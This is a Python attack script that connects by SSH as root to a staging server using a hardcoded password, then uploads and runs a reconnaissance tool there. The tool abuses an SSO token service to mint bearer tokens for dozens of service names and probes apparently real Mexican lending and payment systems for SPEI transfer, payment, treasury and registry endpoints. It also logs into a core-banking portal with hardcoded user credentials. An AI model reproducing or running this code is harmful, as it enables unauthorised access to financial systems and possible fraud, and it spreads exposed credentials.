import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})

SSO_URL = "https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token"

def mint(app, svc):
    r = s.post(SSO_URL, json={"appJwt": app, "serviceName": svc}, timeout=5)
    return r.json().get("token", "") if r.status_code == 200 else ""

# ========================================
# 1. FIND FINANCIAL SERVICES
# ========================================
sys.stdout.write("=" * 60 + "\n=== HUNTING SPEI/TRANSFER SERVICES ===\n" + "=" * 60 + "\n\n")

# Service names to try (financial)
FINANCIAL_SVCS = [
    "spei-service", "stp-service", "transfer-service", "payment-service",
    "disbursement-service", "dispersion-service", "pago-service",
    "transferencia-service", "banking-service", "account-service",
    "deposit-service", "withdrawal-service", "cashout-service",
    "liquidation-service", "liquidacion-service",
    "cobranza-service", "collection-service", "collections-service",
    "credit-service", "loan-service", "prestamo-service",
    "core-service", "core-banking-service",
    "clabe-service", "banxico-service", "stp-gateway",
    "payment-gateway", "payment-orchestrator",
    "finance-service", "finanzas-service",
    "treasury-service", "tesoreria-service",
    "reconciliation-service", "conciliacion-service",
    "transaction-service", "transactions-service",
    "money-service", "funds-service",
    "notification-service", "sms-service",
    "identity-service", "auth-service", "user-service",
    "customer-service", "client-service", "cliente-service",
    "origination-service", "bff-origination-service",
    "gestiona-service", "orchestrator-service",
    "orchestrator-gestiona-service", "orchestrator-gestiona-service-v2",
    "hawking-service", "catalogs-service",
    "multimedia-findep-service",
    "document-service", "documents-service",
    "signature-service", "firma-service",
    "cfdi-service", "facturacion-service",
]

# Mint and probe each
for svc in FINANCIAL_SVCS:
    try:
        tok = mint("TYSON-COBRANZA-GESTIONA", svc)
        if not tok:
            continue
        
        # Try the service directly on tysonprod.com
        base = f"https://{svc}.tysonprod.com"
        for path in ["/", "/health", "/actuator/health", "/actuator/info",
                     "/actuator/env", "/actuator/mappings",
                     "/swagger-ui.html", "/swagger-ui/", "/swagger-ui/index.html",
                     "/v2/api-docs", "/v3/api-docs", "/openapi.json",
                     "/v1/", "/v1/health", "/api/", "/api/v1/"]:
            try:
                r = s.get(f"{base}{path}",
                    headers={"Authorization": f"Bearer {tok}"},
                    timeout=3, allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 20:
                    sys.stdout.write(f"*** HIT *** [{r.status_code}] {svc}{path} ({len(r.text)}b)\n")
                    sys.stdout.write(f"  {r.text[:500]}\n\n")
                elif r.status_code not in [404, 502, 503, -1]:
                    if r.status_code in [401, 403, 405, 301, 302, 308]:
                        sys.stdout.write(f"  [{r.status_code}] {svc}{path}\n")
            except requests.exceptions.ConnectionError:
                break  # host doesn't resolve
            except:
                pass
        sys.stdout.flush()
    except:
        pass

# ========================================
# 2. CORE BANKING FINANCIAL ENDPOINTS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CORE BANKING FINANCIAL ENDPOINTS ===\n" + "=" * 60 + "\n\n")

# Login to core
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write("Logged in to core\n\n")

# Financial .do endpoints to test
FINANCE_PATHS = [
    # SPEI / Transferencias
    "/finanzas/spei.do", "/finanzas/transferencia.do", "/finanzas/transfer.do",
    "/finanzas/dispersiones.do", "/finanzas/dispersion.do",
    "/finanzas/pagos.do", "/finanzas/pago.do",
    "/finanzas/cobranza.do", "/finanzas/cobro.do",
    "/finanzas/tesoreria.do", "/finanzas/treasury.do",
    "/finanzas/cuentas.do", "/finanzas/accounts.do",
    "/finanzas/movimientos.do", "/finanzas/movements.do",
    "/finanzas/conciliacion.do", "/finanzas/stp.do",
    "/finanzas/banxico.do", "/finanzas/clabe.do",
    "/finanzas/deposito.do", "/finanzas/retiro.do",
    "/finanzas/inicio.do", "/finanzas/menu.do", "/finanzas/index.do",
    # Direct paths
    "/spei.do", "/transferencia.do", "/dispersion.do",
    "/pagos.do", "/cobranza.do", "/tesoreria.do",
    "/stp.do", "/banxico.do",
    # Backoffice financial
    "/backoffice/spei.do", "/backoffice/transferencia.do",
    "/backoffice/dispersion.do", "/backoffice/pagos.do",
    "/backoffice/tesoreria.do", "/backoffice/stp.do",
    "/backoffice/movimientos.do", "/backoffice/cuentas.do",
    "/backoffice/depositos.do", "/backoffice/retiros.do",
    # Creditos
    "/creditos/dispersion.do", "/creditos/desembolso.do",
    "/creditos/pago.do", "/creditos/liquidacion.do",
    "/creditos/cobranza.do",
    # API / REST
    "/webresources/catalogo/bancos",
    "/webresources/catalogo/puestos",
    "/webresources/catalogo/empresas",
    "/webresources/catalogo/sucursales",
    "/webresources/spei/", "/webresources/transfer/",
    "/webresources/payment/", "/webresources/dispersion/",
    "/webresources/account/", "/webresources/transaction/",
    # General
    "/finanzas/", "/creditos/", "/sucursales/",
]

for path in FINANCE_PATHS:
    try:
        r = s.get(f"https://core.findep.mx{path}", timeout=5, allow_redirects=False)
        if r.status_code == 200 and len(r.text) > 500:
            title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
            has_novalidado = "NoValid" in r.text
            tag = " [BLOCKED]" if has_novalidado else " *** ACCESSIBLE ***"
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b) Title={title.group(1)[:50] if title else 'N/A'}{tag}\n")
            if not has_novalidado and len(r.text) > 1000:
                # Extract links and forms
                links = re.findall(r'href=["\']([^"\']*\.do[^"\']*)["\']', r.text, re.I)
                forms = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', r.text, re.I)
                if links:
                    sys.stdout.write(f"    Links: {links[:10]}\n")
                if forms:
                    sys.stdout.write(f"    Forms: {forms[:5]}\n")
        elif r.status_code in [302, 301]:
            loc = r.headers.get("Location", "")
            if "NoValido" not in loc and "login" not in loc.lower():
                sys.stdout.write(f"  [{r.status_code}] {path} -> {loc[:80]}\n")
        elif r.status_code == 200 and 0 < len(r.text) < 500:
            # Small REST response
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b) REST: {r.text[:300]}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. EUREKA SERVICE REGISTRY
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== EUREKA SERVICE REGISTRY ===\n" + "=" * 60 + "\n\n")

# Try Eureka on various hosts
eureka_hosts = [
    "https://eureka.calidad-architect.com",
    "https://eureka.tysonprod.com",
    "https://eureka-service.tysonprod.com",
    "https://service-registry.tysonprod.com",
    "https://discovery.tysonprod.com",
    "https://config-service.tysonprod.com",
    "https://config.tysonprod.com",
]

for host in eureka_hosts:
    for path in ["/", "/eureka/apps", "/eureka/apps/", "/apps", "/actuator"]:
        try:
            tok = mint("TYSON-COBRANZA-GESTIONA", "eureka-service")
            r = s.get(f"{host}{path}",
                headers={"Authorization": f"Bearer {tok}", "Accept": "application/json"},
                timeout=5, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 50:
                sys.stdout.write(f"*** HIT *** [{r.status_code}] {host}{path} ({len(r.text)}b)\n")
                sys.stdout.write(f"  {r.text[:2000]}\n\n")
            elif r.status_code not in [404, 502, 503]:
                sys.stdout.write(f"  [{r.status_code}] {host}{path}\n")
        except requests.exceptions.ConnectionError:
            break
        except:
            pass
    sys.stdout.flush()

# Also try calidad-architect IP directly for eureka
K8S_IP = "35.238.21.37"
for host_header in ["eureka.calidad-architect.com", "eureka.orquesta.calidad-architect.com"]:
    try:
        tok = mint("TYSON-COBRANZA-GESTIONA", "eureka-service")
        r = s.get(f"https://{K8S_IP}/eureka/apps",
            headers={"Host": host_header, "Authorization": f"Bearer {tok}", "Accept": "application/json"},
            timeout=5, verify=False)
        sys.stdout.write(f"  K8s [{r.status_code}] Host:{host_header} ({len(r.text)}b)\n")
        if r.status_code == 200 and len(r.text) > 100:
            sys.stdout.write(f"  {r.text[:2000]}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 4. PROBE KNOWN TYSON SERVICES FOR FINANCIAL PATHS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== KNOWN SERVICES - FINANCIAL PATHS ===\n" + "=" * 60 + "\n\n")

known_services = [
    ("orchestrator-gestiona-service-v2.tysonprod.com", "orchestrator-gestiona-service-v2"),
    ("catalogs-service.tysonprod.com", "catalogs-service"),
    ("multimedia-findep-service.tysonprod.com", "multimedia-findep-service"),
    ("dynamicjourney-orchestrator.tysonprod.com", "dynamicjourney-orchestrator"),
    ("sso-jwt-token-service2.tysonprod.com", "sso-jwt-token-service2"),
    ("bff-sso-apps-service.tysonprod.com", "bff-sso-apps-service"),
]

for host, svc_name in known_services:
    tok = mint("TYSON-COBRANZA-GESTIONA", svc_name)
    if not tok:
        continue
    
    sys.stdout.write(f"\n--- {host} ---\n")
    
    financial_paths = [
        "/v1/spei", "/v1/transfers", "/v1/payments", "/v1/disbursements",
        "/v1/dispersiones", "/v1/accounts", "/v1/transactions",
        "/v1/clabe", "/v1/banks", "/v1/stp",
        "/v1/clients", "/v1/customers", "/v1/loans", "/v1/credits",
        "/v2/api-docs", "/v3/api-docs", "/swagger-ui/",
        "/actuator/mappings", "/actuator/env", "/actuator/info",
    ]
    
    for path in financial_paths:
        try:
            r = s.get(f"https://{host}{path}",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=3, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 20:
                sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b)\n")
                sys.stdout.write(f"    {r.text[:500]}\n")
            elif r.status_code in [401, 403, 405]:
                sys.stdout.write(f"  [{r.status_code}] {path}\n")
        except:
            pass
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/find_spei.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/find_spei.py 2>&1', timeout=600)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
